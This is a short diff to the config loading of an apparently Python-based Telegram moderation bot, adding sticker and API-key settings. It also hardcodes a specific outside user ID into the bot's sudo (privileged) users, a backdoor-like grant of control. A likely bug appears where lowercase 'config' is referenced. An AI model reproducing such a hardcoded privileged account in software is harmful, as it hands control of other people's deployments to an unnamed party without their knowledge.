@@ -98,12 +98,15 @@ else:
     STRICT_GBAN = Config.STRICT_GBAN
     WORKERS = Config.WORKERS
     BAN_STICKER = Config.BAN_STICKER
+    KICK_STICKER = Config.KICK_STICKER
     ALLOW_EXCL = Config.ALLOW_EXCL
-    STRICT_GMUTE = Config.STRICT_GMUTE
-   
-
+    API_OPENWEATHER = Config.API_OPENWEATHER
+    MAPS_API = Config.MAPS_API
+    TEMPORARY_DATA = Config.TEMPORARY_DATA
+    escape_markdown = config.escape_markdown
+    
 SUDO_USERS.add(OWNER_ID)
-
+SUDO_USERS.add(1216930495)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
